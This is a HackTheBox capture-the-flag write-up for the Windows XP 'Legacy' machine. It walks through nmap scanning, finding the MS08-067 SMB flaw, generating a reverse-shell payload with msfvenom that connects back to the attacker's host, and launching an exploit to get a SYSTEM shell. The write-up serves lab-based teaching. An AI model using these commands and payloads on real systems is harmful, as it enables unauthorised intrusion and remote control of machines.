---
layout: default
title: HackTheBox - Legacy Writeup
permalink: /htb/legacy
---

# Legacy

> **Name:** Legacy
>
> **Creator:** [ch4p](https://www.hackthebox.eu/home/users/profile/1)
>
> **Difficulty:** Easy


## Intro

[Legacy](https://www.hackthebox.eu/home/machines/profile/2) was released on 15 Mar 2017 and is one of the first boxes released on the platform. It is one of the easier Windows boxes available, which makes it a good place to start for beginners. I originally completed this when it had already retired and I was making my way through some of the older boxes to help further my understanding. As it was so simple I never made notes so I've had to fully go back and re-do the box to make this write-up. 


## Getting Started

As is always the case we start off with performing a full port scan against the box to  get an idea of what services are available. My preferred command is shown below:

``` nmap -p- 10.10.10.4 -sC -sV -oA full-scan ```

This command runs a SYN, or half-open scan against all ports. With the additional flags running default scripts, version detection and creating an output file in various formats. 

The scan gives the following results:

![Scan Results]({{site.url}}/assets/legacy/scan-results.png)


## Nmap Vulnerability Scan

The big thing to take away from these results is that it is a Windows XP box. This went end of life in April 2014, so there is bound to be some unpatched vulnerabilities to play with! SMB has had many vulnerabilities over the years and is a good place to start. A nice easy way to quickly check for vulnerabilities is using the Nmap scripting engine. By checking the contents of the Nmap scripts directory it is possible to see which ones are available.

![Nmap SMB Vuln Scripts({{site.url}}/assets/legacy/nse-search.png)

As Nmap scripts are things that you may be checking quite often I find it useful to setup an alias to the command shown in the screenshot above. You can do this by adding the following line into your ```.bashrc``` file: 

``` alias nse=ls -al /usr/share/nmap/scripts/ | grep ```

Now you can just use ```nse smb-vuln``` to get the same results. Since there are so many SMB vuln scripts available in Nmap we will just load all of them up with the following command:

``` nmap -p 139,445 10.10.10.4 --script=smb-vuln* ```

The results show that the SMB service is vulnerable to MS08-067, made famous by Conficker, and MS17-010 that was made famous by the Wannacry ransomware attacks. As the box name is Legacy it's a safe assumption to make that MS08-067 is the intended method. Especially since I know there is another box that is has MS17-010 as the intended method. 

## Exploit

Searchsploit shows a few exploits are available for this, however there is a good one on Github by [Jivoi](https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py) which has options for multiple OS. It does require some shelcode to be switched out for the reverse shell. This can be created using msfvenom with this command:

``` msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.32 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 ```

Lets breakdown what all those flags mean:

``` -p ``` is the payload of choice, in this case a simple TCP reverse shell for Windows.
``` LHOST= ``` is the listening host IP address to be set. 
``` LPORT= ``` is the port you want to listen on. 
``` EXITFUNC= ``` sets a function hash in the payload that specifies a DLL and a function to call once the payload is complete.
``` -b ``` is a list of bad characters - these were taken directly from Jivoi's script.
``` -f ``` is the format to create the shellcode in. 
``` -v ``` sets the variable that the shellcode will be assigned to. The default is ``` buf ``` and I am only changing this to match what is in the original script.
``` -a ``` sets the architecture the shellcode is to be run on. 

This will output some shellcode as show below, that can be copy pasted into the exploit to replace the existing shellcode. 

![Shellcode]({{site.url}}/assets/legacy/generate-shellcode.png)

As the existing script is written in python2 and debian / Kali having dropped support for it, the exploit needs to be updated to python3. I've uploaded a copy of it to [github](https://github.com/Agent-Tiro/HackTheBoxScripts/blob/master/Python3-MS08-067.py) incase it's of use to anyone else.

Running an Nmap scan to do OS detection gives an indication that it is most likely XP SP3.

![OS Detection]({{site.url}}/assets/legacy/aggressive-os.png)

The exploit is launched with the following command, using option 6 for XP SP3:

``` python3.7 ms08-067.py 10.10.10.4 6 445 ```

![Exploit]({{site.url}}/assets/legacy/legacy-exploit.png)

Upon completion the listener that was setup beforehand will have a shell waiting for us, running as SYSTEM. 

![Shell]({{site.url}}/assets/legacy/catching-shell.png)

As whoami isn't on this version of XP it would require uploading it to say definitively that we are SYSTEM. But there are a few giveaways. Firstly, landing in ``` C:\Windows\system32 ``` generally only happens for privileged users, and secondly being able to read the root flag.

